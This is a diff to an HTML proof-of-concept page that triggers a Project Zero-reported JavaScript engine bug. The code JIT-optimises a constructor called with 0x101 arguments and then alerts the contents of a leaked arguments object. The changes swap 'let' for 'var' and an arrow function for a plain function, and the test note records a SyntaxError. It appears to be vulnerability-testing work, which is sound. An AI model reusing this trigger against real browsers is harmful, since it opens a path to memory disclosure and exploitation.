@@ -1,6 +1,6 @@
 <!--Tested on 5.5.1-->
 <!--Bug tested: https://bugs.chromium.org/p/project-zero/issues/detail?id=1262-->
-<!--Result: Does no run code at all (possibly considered a syntax error)-->
+<!--Result: Does no run code at all, SytaxError about "class"-->
 <html>
     <body>
         Hi!
@@ -8,7 +8,7 @@
         <script>
             const kArgsLength = 0x101;
 
-            let buggy = null;
+            var buggy = null;
             function inlineFunc() {
                 if (arguments.length != kArgsLength) {
                     buggy = arguments;
@@ -19,21 +19,21 @@
             }
 
             function sleep(ms) {
-                let start = new Date();
+                var start = new Date();
                 while (new Date() - start < ms);
             }
 
             function main() {
                 alert("starting...");
-                let args = new Array(kArgsLength);
+                var args = new Array(kArgsLength);
                 args.fill(333 + 1);
                 args = args.join(', ');
 
-                let opt = new Function(`(() => {
+                var opt = new Function(`(function() {
                     new ClassForInine(${args});
                 })();`);
 
-                for (let i = 0; i < 0x100000; i++) {
+                for (var i = 0; i < 0x100000; i++) {
                     opt();
 
                     if (i === 0x3000)
@@ -45,13 +45,14 @@
                     }
                 }
 
-                for (let i = 0, n = buggy.length; i < n; i++) {
+                for (var i = 0, n = buggy.length; i < n; i++) {
                     alert(buggy[i]);
                 }
             }
             document.ontouchstart = function(){
                 main();
             }
+
         </script>
     </body>
 </html>
